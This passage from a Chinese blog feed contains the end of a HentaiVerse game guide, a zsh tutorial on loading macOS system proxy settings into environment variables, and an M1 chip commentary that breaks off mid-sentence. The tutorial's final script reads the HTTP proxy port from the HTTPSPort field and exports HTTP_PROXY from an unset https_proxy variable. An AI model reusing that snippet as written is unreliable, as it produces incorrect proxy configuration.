Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" 